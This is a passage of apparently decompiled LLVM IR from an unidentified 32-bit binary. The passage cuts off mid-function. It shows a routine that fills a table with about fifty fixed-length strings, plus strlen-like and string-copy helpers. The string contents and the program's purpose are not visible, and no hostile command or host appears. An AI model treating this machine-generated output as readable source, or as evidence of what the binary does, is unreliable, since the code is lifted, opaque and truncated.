  ret i32 %v0_804ecd1

; uselistorder directives
  uselistorder i32 %v1_804ecc6, { 1, 0 }
  uselistorder i32 %v1_804ecc1, { 1, 0 }
  uselistorder i32 %v0_804ecbe, { 1, 0 }
  uselistorder i32 %v1_804ec74, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8053120.34 to i32), i32 4), { 1, 2, 0 }
  uselistorder i16* @global_var_8053038.35, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8053120.34 to i32), { 1, 2, 3, 0 }
}

define i32 @function_804ece0() local_unnamed_addr {
dec_label_pc_804ece0:
  %v1_804ece6 = call i32 @function_80504e4(i32 15)
  store i32 %v1_804ece6, i32* @ebx, align 4
  %v3_804ecf8 = call i32 @function_804f610(i32 %v1_804ece6, i32 ptrtoint (i32* @global_var_8052545.36 to i32), i32 15)
  %v0_804ecfd = load i32, i32* @ebx, align 4
  store i32 %v0_804ecfd, i32* @global_var_8053138.37, align 8
  store i16 15, i16* bitcast (i32* @global_var_805313c.38 to i16*), align 4
  %v1_804ed13 = call i32 @function_80504e4(i32 2)
  store i32 %v1_804ed13, i32* @ebx, align 4
  %v3_804ed25 = call i32 @function_804f610(i32 %v1_804ed13, i32 ptrtoint ([3 x i8]* @global_var_8052555.39 to i32), i32 2)
  %v0_804ed2a = load i32, i32* @ebx, align 4
  store i32 %v0_804ed2a, i32* @global_var_8053140.40, align 64
  store i16 2, i16* bitcast (i32* @global_var_8053144.41 to i16*), align 4
  %v1_804ed40 = call i32 @function_80504e4(i32 15)
  store i32 %v1_804ed40, i32* @ebx, align 4
  %v3_804ed52 = call i32 @function_804f610(i32 %v1_804ed40, i32 ptrtoint (i32* @global_var_8052545.36 to i32), i32 15)
  %v0_804ed57 = load i32, i32* @ebx, align 4
  store i32 %v0_804ed57, i32* @global_var_80531b0.42, align 16
  store i16 15, i16* bitcast (i32* @global_var_80531b4.43 to i16*), align 4
  %v1_804ed6d = call i32 @function_80504e4(i32 2)
  store i32 %v1_804ed6d, i32* @ebx, align 4
  %v3_804ed7f = call i32 @function_804f610(i32 %v1_804ed6d, i32 ptrtoint (i32* @global_var_8052558.44 to i32), i32 2)
  %v0_804ed84 = load i32, i32* @ebx, align 4
  store i32 %v0_804ed84, i32* @global_var_80531b8.45, align 8
  store i16 2, i16* bitcast (i32* @global_var_80531bc.46 to i16*), align 4
  %v1_804ed9a = call i32 @function_80504e4(i32 10)
  store i32 %v1_804ed9a, i32* @ebx, align 4
  %v3_804edac = call i32 @function_804f610(i32 %v1_804ed9a, i32 ptrtoint (i32* @global_var_805255b.47 to i32), i32 10)
  %v0_804edb1 = load i32, i32* @ebx, align 4
  store i32 %v0_804edb1, i32* @global_var_8053130.48, align 16
  store i16 10, i16* bitcast (i32* @global_var_8053134.49 to i16*), align 4
  %v1_804edc7 = call i32 @function_80504e4(i32 29)
  store i32 %v1_804edc7, i32* @ebx, align 4
  %v3_804edd9 = call i32 @function_804f610(i32 %v1_804edc7, i32 ptrtoint (i32* @global_var_80526e8.50 to i32), i32 29)
  %v0_804edde = load i32, i32* @ebx, align 4
  store i32 %v0_804edde, i32* @global_var_8053148.51, align 8
  store i16 29, i16* bitcast (i32* @global_var_805314c.52 to i16*), align 4
  %v1_804edf4 = call i32 @function_80504e4(i32 7)
  store i32 %v1_804edf4, i32* @ebx, align 4
  %v3_804ee06 = call i32 @function_804f610(i32 %v1_804edf4, i32 ptrtoint (i32* @global_var_8052566.53 to i32), i32 7)
  %v0_804ee0b = load i32, i32* @ebx, align 4
  store i32 %v0_804ee0b, i32* @global_var_8053150.54, align 16
  store i16 7, i16* bitcast (i32* @global_var_8053154.55 to i16*), align 4
  %v1_804ee21 = call i32 @function_80504e4(i32 5)
  store i32 %v1_804ee21, i32* @ebx, align 4
  %v3_804ee33 = call i32 @function_804f610(i32 %v1_804ee21, i32 ptrtoint (i32* @global_var_805256e.56 to i32), i32 5)
  %v0_804ee38 = load i32, i32* @ebx, align 4
  store i32 %v0_804ee38, i32* @global_var_8053158.57, align 8
  store i16 5, i16* bitcast (i32* @global_var_805315c.58 to i16*), align 4
  %v1_804ee4e = call i32 @function_80504e4(i32 11)
  store i32 %v1_804ee4e, i32* @ebx, align 4
  %v3_804ee60 = call i32 @function_804f610(i32 %v1_804ee4e, i32 ptrtoint (i32* @global_var_8052574.59 to i32), i32 11)
  %v0_804ee65 = load i32, i32* @ebx, align 4
  store i32 %v0_804ee65, i32* @global_var_8053160.60, align 32
  store i16 11, i16* bitcast (i32* @global_var_8053164.61 to i16*), align 4
  %v1_804ee7b = call i32 @function_80504e4(i32 4)
  store i32 %v1_804ee7b, i32* @ebx, align 4
  %v3_804ee8d = call i32 @function_804f610(i32 %v1_804ee7b, i32 ptrtoint (i32* @global_var_805257f.62 to i32), i32 4)
  %v0_804ee92 = load i32, i32* @ebx, align 4
  store i32 %v0_804ee92, i32* @global_var_8053168.63, align 8
  store i16 4, i16* bitcast (i32* @global_var_805316c.64 to i16*), align 4
  %v1_804eea8 = call i32 @function_80504e4(i32 7)
  store i32 %v1_804eea8, i32* @ebx, align 4
  %v3_804eeba = call i32 @function_804f610(i32 %v1_804eea8, i32 ptrtoint (i32* @global_var_8052584.65 to i32), i32 7)
  %v0_804eebf = load i32, i32* @ebx, align 4
  store i32 %v0_804eebf, i32* @global_var_8053170.66, align 16
  store i16 7, i16* bitcast (i32* @global_var_8053174.67 to i16*), align 4
  %v1_804eed5 = call i32 @function_80504e4(i32 8)
  store i32 %v1_804eed5, i32* @ebx, align 4
  %v3_804eee7 = call i32 @function_804f610(i32 %v1_804eed5, i32 ptrtoint (i32* @global_var_805258c.68 to i32), i32 8)
  %v0_804eeec = load i32, i32* @ebx, align 4
  store i32 %v0_804eeec, i32* @global_var_8053178.69, align 8
  store i16 8, i16* bitcast (i32* @global_var_805317c.70 to i16*), align 4
  %v1_804ef02 = call i32 @function_80504e4(i32 13)
  store i32 %v1_804ef02, i32* @ebx, align 4
  %v3_804ef14 = call i32 @function_804f610(i32 %v1_804ef02, i32 ptrtoint (i32* @global_var_8052595.71 to i32), i32 13)
  %v0_804ef19 = load i32, i32* @ebx, align 4
  store i32 %v0_804ef19, i32* @global_var_8053180.72, align 128
  store i16 13, i16* bitcast (i32* @global_var_8053184.73 to i16*), align 4
  %v1_804ef2f = call i32 @function_80504e4(i32 10)
  store i32 %v1_804ef2f, i32* @ebx, align 4
  %v3_804ef41 = call i32 @function_804f610(i32 %v1_804ef2f, i32 ptrtoint ([11 x i8]* @global_var_80525a3.74 to i32), i32 10)
  %v0_804ef46 = load i32, i32* @ebx, align 4
  store i32 %v0_804ef46, i32* @global_var_8053188.75, align 8
  store i16 10, i16* bitcast (i32* @global_var_805318c.76 to i16*), align 4
  %v1_804ef5c = call i32 @function_80504e4(i32 10)
  store i32 %v1_804ef5c, i32* @ebx, align 4
  %v3_804ef6e = call i32 @function_804f610(i32 %v1_804ef5c, i32 ptrtoint ([11 x i8]* @global_var_80525ae.77 to i32), i32 10)
  %v0_804ef73 = load i32, i32* @ebx, align 4
  store i32 %v0_804ef73, i32* @global_var_8053190.78, align 16
  store i16 10, i16* bitcast (i32* @global_var_8053194.79 to i16*), align 4
  %v1_804ef89 = call i32 @function_80504e4(i32 33)
  store i32 %v1_804ef89, i32* @ebx, align 4
  %v3_804ef9b = call i32 @function_804f610(i32 %v1_804ef89, i32 ptrtoint (i32* @global_var_80529d8.80 to i32), i32 33)
  %v0_804efa0 = load i32, i32* @ebx, align 4
  store i32 %v0_804efa0, i32* @global_var_8053198.81, align 8
  store i16 33, i16* bitcast (i32* @global_var_805319c.82 to i16*), align 4
  %v1_804efb6 = call i32 @function_80504e4(i32 8)
  store i32 %v1_804efb6, i32* @ebx, align 4
  %v3_804efc8 = call i32 @function_804f610(i32 %v1_804efb6, i32 ptrtoint (i32* @global_var_80525b9.83 to i32), i32 8)
  %v0_804efcd = load i32, i32* @ebx, align 4
  store i32 %v0_804efcd, i32* @global_var_80531a0.84, align 32
  store i16 8, i16* bitcast (i32* @global_var_80531a4.85 to i16*), align 4
  %v1_804efe3 = call i32 @function_80504e4(i32 11)
  store i32 %v1_804efe3, i32* @ebx, align 4
  %v3_804eff5 = call i32 @function_804f610(i32 %v1_804efe3, i32 ptrtoint ([12 x i8]* @global_var_80525c2.86 to i32), i32 11)
  %v0_804effa = load i32, i32* @ebx, align 4
  store i32 %v0_804effa, i32* @global_var_80531a8.87, align 8
  store i16 11, i16* bitcast (i32* @global_var_80531ac.88 to i16*), align 4
  %v1_804f010 = call i32 @function_80504e4(i32 6)
  store i32 %v1_804f010, i32* @ebx, align 4
  %v3_804f022 = call i32 @function_804f610(i32 %v1_804f010, i32 ptrtoint (i32* @global_var_80525ce.89 to i32), i32 6)
  %v0_804f027 = load i32, i32* @ebx, align 4
  store i32 %v0_804f027, i32* @global_var_80531c0.90, align 64
  store i16 6, i16* bitcast (i32* @global_var_80531c4.91 to i16*), align 4
  %v1_804f03d = call i32 @function_80504e4(i32 7)
  store i32 %v1_804f03d, i32* @ebx, align 4
  %v3_804f04f = call i32 @function_804f610(i32 %v1_804f03d, i32 ptrtoint (i32* @global_var_8052706.92 to i32), i32 7)
  %v0_804f054 = load i32, i32* @ebx, align 4
  store i32 %v0_804f054, i32* @global_var_80531c8.93, align 8
  store i16 7, i16* bitcast (i32* @global_var_80531cc.94 to i16*), align 4
  %v1_804f06a = call i32 @function_80504e4(i32 7)
  store i32 %v1_804f06a, i32* @ebx, align 4
  %v3_804f07c = call i32 @function_804f610(i32 %v1_804f06a, i32 ptrtoint (i32* @global_var_80525d5.95 to i32), i32 7)
  %v0_804f081 = load i32, i32* @ebx, align 4
  store i32 %v0_804f081, i32* @global_var_80531d0.96, align 16
  store i16 7, i16* bitcast (i32* @global_var_80531d4.97 to i16*), align 4
  %v1_804f097 = call i32 @function_80504e4(i32 3)
  store i32 %v1_804f097, i32* @ebx, align 4
  %v3_804f0a9 = call i32 @function_804f610(i32 %v1_804f097, i32 ptrtoint (i32* @global_var_80525dd.98 to i32), i32 3)
  %v0_804f0ae = load i32, i32* @ebx, align 4
  store i32 %v0_804f0ae, i32* @global_var_80531d8.99, align 8
  store i16 3, i16* bitcast (i32* @global_var_80531dc.100 to i16*), align 4
  %v1_804f0c4 = call i32 @function_80504e4(i32 19)
  store i32 %v1_804f0c4, i32* @ebx, align 4
  %v3_804f0d6 = call i32 @function_804f610(i32 %v1_804f0c4, i32 ptrtoint (i32* @global_var_805270e.101 to i32), i32 19)
  %v0_804f0db = load i32, i32* @ebx, align 4
  store i32 %v0_804f0db, i32* @global_var_80531e0.102, align 32
  store i16 19, i16* bitcast (i32* @global_var_80531e4.103 to i16*), align 4
  %v1_804f0f1 = call i32 @function_80504e4(i32 24)
  store i32 %v1_804f0f1, i32* @ebx, align 4
  %v3_804f103 = call i32 @function_804f610(i32 %v1_804f0f1, i32 ptrtoint (i32* @global_var_80525e1.104 to i32), i32 24)
  %v0_804f108 = load i32, i32* @ebx, align 4
  store i32 %v0_804f108, i32* @global_var_80531e8.105, align 8
  store i16 24, i16* bitcast (i32* @global_var_80531ec.106 to i16*), align 4
  %v1_804f11e = call i32 @function_80504e4(i32 9)
  store i32 %v1_804f11e, i32* @ebx, align 4
  %v3_804f130 = call i32 @function_804f610(i32 %v1_804f11e, i32 ptrtoint (i32* @global_var_80525fa.107 to i32), i32 9)
  %v0_804f135 = load i32, i32* @ebx, align 4
  store i32 %v0_804f135, i32* @global_var_80531f0.108, align 16
  store i16 9, i16* bitcast (i32* @global_var_80531f4.109 to i16*), align 4
  %v1_804f14b = call i32 @function_80504e4(i32 16)
  store i32 %v1_804f14b, i32* @ebx, align 4
  %v3_804f15d = call i32 @function_804f610(i32 %v1_804f14b, i32 ptrtoint (i32* @global_var_8052722.110 to i32), i32 16)
  %v0_804f162 = load i32, i32* @ebx, align 4
  store i32 %v0_804f162, i32* @global_var_80531f8.111, align 8
  store i16 16, i16* bitcast (i32* @global_var_80531fc.112 to i16*), align 4
  %v1_804f178 = call i32 @function_80504e4(i32 22)
  store i32 %v1_804f178, i32* @ebx, align 4
  %v3_804f18a = call i32 @function_804f610(i32 %v1_804f178, i32 ptrtoint (i32* @global_var_8052733.113 to i32), i32 22)
  %v0_804f18f = load i32, i32* @ebx, align 4
  store i32 %v0_804f18f, i32* @global_var_8053200.114, align 512
  store i16 22, i16* bitcast (i32* @global_var_8053204.115 to i16*), align 4
  %v1_804f1a5 = call i32 @function_80504e4(i32 21)
  store i32 %v1_804f1a5, i32* @ebx, align 4
  %v3_804f1b7 = call i32 @function_804f610(i32 %v1_804f1a5, i32 ptrtoint (i32* @global_var_8052604.116 to i32), i32 21)
  %v0_804f1bc = load i32, i32* @ebx, align 4
  store i32 %v0_804f1bc, i32* @global_var_8053208.117, align 8
  store i16 21, i16* bitcast (i32* @global_var_805320c.118 to i16*), align 4
  %v1_804f1d2 = call i32 @function_80504e4(i32 17)
  store i32 %v1_804f1d2, i32* @ebx, align 4
  %v3_804f1e4 = call i32 @function_804f610(i32 %v1_804f1d2, i32 ptrtoint (i32* @global_var_805261a.119 to i32), i32 17)
  %v0_804f1e9 = load i32, i32* @ebx, align 4
  store i32 %v0_804f1e9, i32* @global_var_8053210.120, align 16
  store i16 17, i16* bitcast (i32* @global_var_8053214.121 to i16*), align 4
  %v1_804f1ff = call i32 @function_80504e4(i32 12)
  store i32 %v1_804f1ff, i32* @ebx, align 4
  %v3_804f211 = call i32 @function_804f610(i32 %v1_804f1ff, i32 ptrtoint (i32* @global_var_805262c.122 to i32), i32 12)
  %v0_804f216 = load i32, i32* @ebx, align 4
  store i32 %v0_804f216, i32* @global_var_8053218.123, align 8
  store i16 12, i16* bitcast (i32* @global_var_805321c.124 to i16*), align 4
  %v1_804f22c = call i32 @function_80504e4(i32 23)
  store i32 %v1_804f22c, i32* @ebx, align 4
  %v3_804f23e = call i32 @function_804f610(i32 %v1_804f22c, i32 ptrtoint (i32* @global_var_8052639.125 to i32), i32 23)
  %v0_804f243 = load i32, i32* @ebx, align 4
  store i32 %v0_804f243, i32* @global_var_8053220.126, align 32
  store i16 23, i16* bitcast (i32* @global_var_8053224.127 to i16*), align 4
  %v1_804f259 = call i32 @function_80504e4(i32 83)
  store i32 %v1_804f259, i32* @ebx, align 4
  %v3_804f26b = call i32 @function_804f610(i32 %v1_804f259, i32 ptrtoint (i32* @global_var_805274c.128 to i32), i32 83)
  %v0_804f270 = load i32, i32* @ebx, align 4
  store i32 %v0_804f270, i32* @global_var_8053228.129, align 8
  store i16 83, i16* bitcast (i32* @global_var_805322c.130 to i16*), align 4
  %v1_804f286 = call i32 @function_80504e4(i32 32)
  store i32 %v1_804f286, i32* @ebx, align 4
  %v3_804f298 = call i32 @function_804f610(i32 %v1_804f286, i32 ptrtoint (i32* @global_var_80529fc.131 to i32), i32 32)
  %v0_804f29d = load i32, i32* @ebx, align 4
  store i32 %v0_804f29d, i32* @global_var_8053230.132, align 16
  store i16 32, i16* bitcast (i32* @global_var_8053234.133 to i16*), align 4
  %v1_804f2b3 = call i32 @function_80504e4(i32 48)
  store i32 %v1_804f2b3, i32* @ebx, align 4
  %v3_804f2c5 = call i32 @function_804f610(i32 %v1_804f2b3, i32 ptrtoint (i32* @global_var_8052a20.134 to i32), i32 48)
  %v0_804f2ca = load i32, i32* @ebx, align 4
  store i32 %v0_804f2ca, i32* @global_var_8053238.135, align 8
  store i16 48, i16* bitcast (i32* @global_var_805323c.136 to i16*), align 4
  %v1_804f2e0 = call i32 @function_80504e4(i32 12)
  store i32 %v1_804f2e0, i32* @ebx, align 4
  %v3_804f2f2 = call i32 @function_804f610(i32 %v1_804f2e0, i32 ptrtoint (i32* @global_var_8052651.137 to i32), i32 12)
  %v0_804f2f7 = load i32, i32* @ebx, align 4
  store i32 %v0_804f2f7, i32* @global_var_8053240.138, align 64
  store i16 12, i16* bitcast (i32* @global_var_8053244.139 to i16*), align 4
  %v1_804f30d = call i32 @function_80504e4(i32 9)
  store i32 %v1_804f30d, i32* @ebx, align 4
  %v3_804f31f = call i32 @function_804f610(i32 %v1_804f30d, i32 ptrtoint (i32* @global_var_805265e.140 to i32), i32 9)
  %v0_804f324 = load i32, i32* @ebx, align 4
  store i32 %v0_804f324, i32* @global_var_8053248.141, align 8
  store i16 9, i16* bitcast (i32* @global_var_805324c.142 to i16*), align 4
  %v1_804f33a = call i32 @function_80504e4(i32 10)
  store i32 %v1_804f33a, i32* @ebx, align 4
  %v3_804f34c = call i32 @function_804f610(i32 %v1_804f33a, i32 ptrtoint (i32* @global_var_8052668.143 to i32), i32 10)
  %v0_804f351 = load i32, i32* @ebx, align 4
  store i32 %v0_804f351, i32* @global_var_8053250.144, align 16
  store i16 10, i16* bitcast (i32* @global_var_8053254.145 to i16*), align 4
  %v1_804f367 = call i32 @function_80504e4(i32 12)
  store i32 %v1_804f367, i32* @ebx, align 4
  %v3_804f379 = call i32 @function_804f610(i32 %v1_804f367, i32 ptrtoint (i32* @global_var_8052673.146 to i32), i32 12)
  %v0_804f37e = load i32, i32* @ebx, align 4
  store i32 %v0_804f37e, i32* @global_var_8053258.147, align 8
  store i16 12, i16* bitcast (i32* @global_var_805325c.148 to i16*), align 4
  %v1_804f394 = call i32 @function_80504e4(i32 16)
  store i32 %v1_804f394, i32* @ebx, align 4
  %v3_804f3a6 = call i32 @function_804f610(i32 %v1_804f394, i32 ptrtoint (i32* @global_var_8052680.149 to i32), i32 16)
  %v0_804f3ab = load i32, i32* @ebx, align 4
  store i32 %v0_804f3ab, i32* @global_var_8053260.150, align 32
  store i16 16, i16* bitcast (i32* @global_var_8053264.151 to i16*), align 4
  %v1_804f3c1 = call i32 @function_80504e4(i32 19)
  store i32 %v1_804f3c1, i32* @ebx, align 4
  %v3_804f3d3 = call i32 @function_804f610(i32 %v1_804f3c1, i32 ptrtoint (i32* @global_var_8052691.152 to i32), i32 19)
  %v0_804f3d8 = load i32, i32* @ebx, align 4
  store i32 %v0_804f3d8, i32* @global_var_8053268.153, align 8
  store i16 19, i16* bitcast (i32* @global_var_805326c.154 to i16*), align 4
  %v1_804f3ee = call i32 @function_80504e4(i32 8)
  store i32 %v1_804f3ee, i32* @ebx, align 4
  %v3_804f400 = call i32 @function_804f610(i32 %v1_804f3ee, i32 ptrtoint (i32* @global_var_80526a5.155 to i32), i32 8)
  %v0_804f405 = load i32, i32* @ebx, align 4
  store i32 %v0_804f405, i32* @global_var_8053270.156, align 16
  store i16 8, i16* bitcast (i32* @global_var_8053274.157 to i16*), align 4
  %v1_804f41b = call i32 @function_80504e4(i32 11)
  store i32 %v1_804f41b, i32* @ebx, align 4
  %v3_804f42d = call i32 @function_804f610(i32 %v1_804f41b, i32 ptrtoint (i32* @global_var_8052645.158 to i32), i32 11)
  %v0_804f432 = load i32, i32* @ebx, align 4
  store i32 %v0_804f432, i32* @global_var_8053278.159, align 8
  store i16 11, i16* bitcast (i32* @global_var_805327c.160 to i16*), align 4
  %v1_804f448 = call i32 @function_80504e4(i32 12)
  store i32 %v1_804f448, i32* @ebx, align 4
  %v3_804f45a = call i32 @function_804f610(i32 %v1_804f448, i32 ptrtoint (i32* @global_var_80526ae.161 to i32), i32 12)
  %v0_804f45f = load i32, i32* @ebx, align 4
  store i32 %v0_804f45f, i32* @global_var_8053280.162, align 128
  store i16 12, i16* bitcast (i32* @global_var_8053284.163 to i16*), align 4
  %v1_804f475 = call i32 @function_80504e4(i32 18)
  store i32 %v1_804f475, i32* @ebx, align 4
  %v3_804f487 = call i32 @function_804f610(i32 %v1_804f475, i32 ptrtoint (i32* @global_var_80526bb.164 to i32), i32 18)
  %v0_804f48c = load i32, i32* @ebx, align 4
  store i32 %v0_804f48c, i32* @global_var_8053288.165, align 8
  store i16 18, i16* bitcast (i32* @global_var_805328c.166 to i16*), align 4
  %v1_804f4a2 = call i32 @function_80504e4(i32 25)
  store i32 %v1_804f4a2, i32* @ebx, align 4
  %v3_804f4b4 = call i32 @function_804f610(i32 %v1_804f4a2, i32 ptrtoint (i32* @global_var_80526ce.167 to i32), i32 25)
  %v0_804f4b9 = load i32, i32* @ebx, align 4
  store i32 %v0_804f4b9, i32* @global_var_8053290.168, align 16
  store i16 25, i16* bitcast (i32* @global_var_8053294.169 to i16*), align 4
  %v1_804f4cf = call i32 @function_80504e4(i32 111)
  store i32 %v1_804f4cf, i32* @ebx, align 4
  %v3_804f4e1 = call i32 @function_804f610(i32 %v1_804f4cf, i32 ptrtoint (i32* @global_var_80527a0.170 to i32), i32 111)
  %v0_804f4e6 = load i32, i32* @ebx, align 4
  store i32 %v0_804f4e6, i32* @global_var_8053298.171, align 8
  store i16 111, i16* bitcast (i32* @global_var_805329c.172 to i16*), align 4
  %v1_804f4fc = call i32 @function_80504e4(i32 111)
  store i32 %v1_804f4fc, i32* @ebx, align 4
  %v3_804f50e = call i32 @function_804f610(i32 %v1_804f4fc, i32 ptrtoint (i32* @global_var_8052810.173 to i32), i32 111)
  %v0_804f513 = load i32, i32* @ebx, align 4
  store i32 %v0_804f513, i32* @global_var_80532a0.174, align 32
  store i16 111, i16* bitcast (i32* @global_var_80532a4.175 to i16*), align 4
  %v1_804f529 = call i32 @function_80504e4(i32 110)
  store i32 %v1_804f529, i32* @ebx, align 4
  %v3_804f53b = call i32 @function_804f610(i32 %v1_804f529, i32 ptrtoint (i32* @global_var_8052880.176 to i32), i32 110)
  %v0_804f540 = load i32, i32* @ebx, align 4
  store i32 %v0_804f540, i32* @global_var_80532a8.177, align 8
  store i16 110, i16* bitcast (i32* @global_var_80532ac.178 to i16*), align 4
  %v1_804f556 = call i32 @function_80504e4(i32 110)
  store i32 %v1_804f556, i32* @ebx, align 4
  %v3_804f568 = call i32 @function_804f610(i32 %v1_804f556, i32 ptrtoint (i32* @global_var_80528f0.179 to i32), i32 110)
  %v0_804f56d = load i32, i32* @ebx, align 4
  store i32 %v0_804f56d, i32* @global_var_80532b0.180, align 16
  store i16 110, i16* bitcast (i32* @global_var_80532b4.181 to i16*), align 4
  %v1_804f583 = call i32 @function_80504e4(i32 117)
  store i32 %v1_804f583, i32* @ebx, align 4
  %v3_804f595 = call i32 @function_804f610(i32 %v1_804f583, i32 ptrtoint (i32* @global_var_8052960.182 to i32), i32 117)
  %v0_804f59a = load i32, i32* @ebx, align 4
  store i32 %v0_804f59a, i32* @global_var_80532b8.183, align 8
  store i16 117, i16* bitcast (i32* @global_var_80532bc.184 to i16*), align 4
  ret i32 %v3_804f595

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @function_804f610, { 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @function_804f5b0(i8* %arg1) local_unnamed_addr {
dec_label_pc_804f5b0:
  %v4_804f5b0 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f5b0, i32* @edx, align 4
  %v2_804f5b6 = load i8, i8* %arg1, align 1
  %v3_804f5b6 = icmp eq i8 %v2_804f5b6, 0
  br i1 %v3_804f5b6, label %dec_label_pc_804f5c7, label %dec_label_pc_804f5c0

dec_label_pc_804f5c0:                             ; preds = %dec_label_pc_804f5b0, %dec_label_pc_804f5c0
  %v0_804f5c0 = phi i32 [ %v1_804f5c0, %dec_label_pc_804f5c0 ], [ 0, %dec_label_pc_804f5b0 ]
  %v1_804f5c0 = add i32 %v0_804f5c0, 1
  %v2_804f5c1 = add i32 %v1_804f5c0, %v4_804f5b0
  %v3_804f5c1 = inttoptr i32 %v2_804f5c1 to i8*
  %v4_804f5c1 = load i8, i8* %v3_804f5c1, align 1
  %v5_804f5c1 = icmp eq i8 %v4_804f5c1, 0
  %v1_804f5c5 = icmp eq i1 %v5_804f5c1, false
  br i1 %v1_804f5c5, label %dec_label_pc_804f5c0, label %dec_label_pc_804f5c7

dec_label_pc_804f5c7:                             ; preds = %dec_label_pc_804f5c0, %dec_label_pc_804f5b0
  %v0_804f5c7 = phi i32 [ 0, %dec_label_pc_804f5b0 ], [ %v1_804f5c0, %dec_label_pc_804f5c0 ]
  ret i32 %v0_804f5c7

; uselistorder directives
  uselistorder label %dec_label_pc_804f5c0, { 1, 0 }
}

define i32 @function_804f5d0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804f5d0:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp15 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_804f5d1 = load i32, i32* @ebx, align 4
  store i32 %v0_804f5d1, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v4_804f5d6 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f5d6, i32* %edx.global-to-local, align 4
  %v2_804f5da = load i8, i8* %tmp15, align 1
  %v3_804f5da = icmp eq i8 %v2_804f5da, 0
  br i1 %v3_804f5da, label %dec_label_pc_804f604, label %dec_label_pc_804f5df

dec_label_pc_804f5df:                             ; preds = %dec_label_pc_804f5d0
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f5e1

dec_label_pc_804f5e1:                             ; preds = %dec_label_pc_804f5e1, %dec_label_pc_804f5df
  %v0_804f5e1 = phi i32 [ %v1_804f5e1, %dec_label_pc_804f5e1 ], [ 0, %dec_label_pc_804f5df ]
  %v1_804f5e1 = add i32 %v0_804f5e1, 1
  store i32 %v1_804f5e1, i32* %esi.global-to-local, align 4
  %v2_804f5e2 = add i32 %v1_804f5e1, %arg2
  %v3_804f5e2 = inttoptr i32 %v2_804f5e2 to i8*
  %v4_804f5e2 = load i8, i8* %v3_804f5e2, align 1
  %v5_804f5e2 = icmp eq i8 %v4_804f5e2, 0
  %v1_804f5e6 = icmp eq i1 %v5_804f5e2, false
  br i1 %v1_804f5e6, label %dec_label_pc_804f5e1, label %dec_label_pc_804f5e8

dec_label_pc_804f5e8:                             ; preds = %dec_label_pc_804f5e1
  %v10_804f5e8 = icmp eq i32 %v0_804f5e1, -2
  br i1 %v10_804f5e8, label %dec_label_pc_804f5ff, label %dec_label_pc_804f5ed

dec_label_pc_804f5ed:                             ; preds = %dec_label_pc_804f5e8
  store i32 %v4_804f5d6, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %v1_804f5e1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f5f3

dec_label_pc_804f5f3:                             ; preds = %dec_label_pc_804f604, %dec_label_pc_804f5ed, %dec_label_pc_804f5f3.dec_label_pc_804f5f3_crit_edge
  %v2_804f5f6 = phi i32 [ %v1_804f5f9, %dec_label_pc_804f5f3.dec_label_pc_804f5f3_crit_edge ], [ %v4_804f5d6, %dec_label_pc_804f5ed ], [ %v4_804f5d6, %dec_label_pc_804f604 ]
  %v0_804f5f5 = phi i32 [ %v0_804f5fa, %dec_label_pc_804f5f3.dec_label_pc_804f5f3_crit_edge ], [ %v1_804f5e1, %dec_label_pc_804f5ed ], [ 0, %dec_label_pc_804f604 ]
  %v4_804f5f3 = phi i32 [ %v4_804f5f3.pre, %dec_label_pc_804f5f3.dec_label_pc_804f5f3_crit_edge ], [ %arg2, %dec_label_pc_804f5ed ], [ %arg2, %dec_label_pc_804f604 ]
  %v0_804f5f3 = phi i32 [ %v1_804f5f8, %dec_label_pc_804f5f3.dec_label_pc_804f5f3_crit_edge ], [ %arg2, %dec_label_pc_804f5ed ], [ %arg2, %dec_label_pc_804f604 ]
  %v1_804f5f3 = inttoptr i32 %v0_804f5f3 to i8*
  %v2_804f5f3 = load i8, i8* %v1_804f5f3, align 1
  %v3_804f5f3 = zext i8 %v2_804f5f3 to i32
  %v5_804f5f3 = and i32 %v4_804f5f3, -256
  %v6_804f5f3 = or i32 %v3_804f5f3, %v5_804f5f3
  store i32 %v6_804f5f3, i32* %eax.global-to-local, align 4
  %v1_804f5f5 = add i32 %v0_804f5f5, -1
  store i32 %v1_804f5f5, i32* %edx.global-to-local, align 4
  %v3_804f5f6 = inttoptr i32 %v2_804f5f6 to i8*
  store i8 %v2_804f5f3, i8* %v3_804f5f6, align 1
  %v0_804f5f8 = load i32, i32* @ecx, align 4
  %v1_804f5f8 = add i32 %v0_804f5f8, 1
  store i32 %v1_804f5f8, i32* @ecx, align 4
  %v0_804f5f9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f5f9 = add i32 %v0_804f5f9, 1
  store i32 %v1_804f5f9, i32* %ebx.global-to-local, align 4
  %v0_804f5fa = load i32, i32* %edx.global-to-local, align 4
  %v10_804f5fa = icmp eq i32 %v0_804f5fa, -1
  %v1_804f5fd = icmp eq i1 %v10_804f5fa, false
  br i1 %v1_804f5fd, label %dec_label_pc_804f5f3.dec_label_pc_804f5f3_crit_edge, label %dec_label_pc_804f5ff.loopexit

dec_label_pc_804f5f3.dec_label_pc_804f5f3_crit_edge: ; preds = %dec_label_pc_804f5f3
  %v4_804f5f3.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f5f3

dec_label_pc_804f5ff.loopexit:                    ; preds = %dec_label_pc_804f5f3
  %v0_804f5ff.pre = load i32, i32* %esi.global-to-local, align 4
  %v2_804f601.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804f5ff

dec_label_pc_804f5ff:                             ; preds = %dec_label_pc_804f5ff.loopexit, %dec_label_pc_804f5e8
